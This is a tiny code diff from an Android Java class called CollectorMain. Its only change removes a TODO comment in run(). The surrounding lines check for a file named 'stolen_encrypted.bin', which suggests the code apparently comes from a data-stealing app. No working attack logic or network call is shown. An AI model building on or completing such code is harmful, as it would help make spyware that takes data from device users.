@@ -44,7 +44,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	
 	@Override
 	public void run() {
-		// TODO: Implement this method
 		SharedPreferences sb;
 		String uuid=TheApplication.instance.uuid;
 		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
